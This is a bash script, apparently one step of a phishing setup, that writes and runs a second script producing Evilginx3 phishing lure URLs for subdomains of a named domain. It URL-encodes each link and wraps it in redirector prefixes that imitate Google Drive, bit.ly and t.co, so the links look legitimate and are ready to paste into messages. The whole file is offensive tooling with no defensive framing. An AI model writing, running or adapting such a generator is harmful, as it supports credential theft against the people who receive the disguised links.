#!/bin/bash
# === STEP 3: ENTERPRISE-GRADE PHISHING LURE GENERATOR ===
# Objective: Autogenerate cloaked, redirecting Evilginx3 phishing links w/ tracking
# Domain: hrahra.org | Subdomains: www, login | Output: Copy-paste-ready URLs

set -euo pipefail

SCRIPT="/tmp/lure_generator.sh"
cat > "$SCRIPT" <<'EOF'
#!/bin/bash
set -euo pipefail

# === CONFIGURATION ===
DOMAIN="hrahra.org"
LURE_OUTPUT="/opt/evilginx3/lures.txt"
PHISHLETS=("login" "securelogin" "webmail")
REDIRECTORS=("https://drive.google.com/uc?id=" "https://bit.ly/create/" "https://t.co/redirect/")
TEMPLATE="https://%s.%s"

mkdir -p "$(dirname "$LURE_OUTPUT")"
: > "$LURE_OUTPUT"

log() { echo -e "\033[1;32m[+] $*\033[0m"; }
fatal() { echo -e "\033[1;31m[✘] $*\033[0m" >&2; exit 1; }

generate_encoded_url() {
    local full_url="$1"
    python3 -c "import urllib.parse; print(urllib.parse.quote('''$full_url'''))"
}

generate_lure_links() {
    log "Generating phishing lure URLs"
    for phishlet in "${PHISHLETS[@]}"; do
        local url
        url=$(printf "$TEMPLATE" "$phishlet" "$DOMAIN")
        encoded=$(generate_encoded_url "$url")
        echo "Direct : $url" >> "$LURE_OUTPUT"
        for redirector in "${REDIRECTORS[@]}"; do
            echo "Via ${redirector%%/*}: ${redirector}${encoded}" >> "$LURE_OUTPUT"
        done
        echo "---" >> "$LURE_OUTPUT"
    done
}

generate_lure_links
log "Lure generation complete. Output: $LURE_OUTPUT"
cat "$LURE_OUTPUT"
EOF

chmod +x "$SCRIPT"
sudo "$SCRIPT"
